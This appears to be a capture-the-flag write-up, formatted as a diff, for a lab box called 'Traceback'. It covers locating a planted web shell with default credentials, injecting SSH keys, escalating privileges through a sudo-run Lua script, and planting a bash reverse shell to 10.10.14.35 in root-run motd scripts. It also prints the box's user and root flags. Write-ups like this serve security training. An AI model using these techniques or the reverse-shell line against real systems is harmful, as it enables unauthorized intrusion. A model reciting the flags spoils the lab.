@@ -1,0 +1,29 @@
+After the nmap scans we have only two ports open, 22 ( SSH ) and 80 ( Web )
+
+Recon the webserver.
+We have an already hacked website which has a backend connected shell. For this we should try and get the shell. In the sourcecode of the file is an interesting message, `Some of the best web shells that you might need`. If we google this along side with the name of the `hacker` we get a git repository that contain a bounch of web shells. I created a list into `wordlist` and fuzzed it to get that the shell is under 'http://10.10.10.181/smevk.php'.
+
+Exploiting the shell to get the first user. 
+The credentials of this shell are in the related file of the repository, being `admin:admin` and now we have full access to the backend shell. With this we can inject our ssh keys to the `webadmin/.ssh/authorized_keys` and get the ssh as the first user. 
+But, we don't quite need those. If we look close in the file of the home directory we get the `.bash_history`. 
+
+Privesc to the second user.
+Either we have the ssh or just the shell exection we can create a new `file.lua` in which we paste the content of the privesc.lua but modifing our ssh key. And now to trigger this process we can just redo the sudo cmd  but with file.lua, being `sudo -u sysadmin /home/webadmin/luvit file.lua`
+
+Note: You can automate the whole process. see this in self_pwn.b64.
+
+Now we are as sysadmin.
+Here, if we look closely in the pspy ( in the first hours of the box release .bash_history was available ) we can see that root is copying every 30 seconds the `updated-motd.d` files. I copied all files ( 00-header, 10-help-text, 50-motd-news, 80-esm and 91-release-upgrade ) under /tmp/updated-motd.d and than add a `printf "\nPWNEDD!" bash -c 'bash -i >& /dev/tcp/10.10.14.35/4242 0>&1'` at the beginning of each file. Now I just copy all the files /tmp to /etc and login again to the user.
+
+Note: You have the archive with the files under `update-motd.tar.gz` and the cmd list on `self_root`.
+
+Rooted. 
+
+Note: The ssh keys that I've used are `Traceback` and `Traceback.pub`. 
+
+Flags:
+-> User: c24349701ae38c33ffbf0cceb2c46020
+-> Root: ccda9e554daa04f6f56d822a357585d6
+
+Articles:
+-> https://github.com/Xh4H/Web-Shells
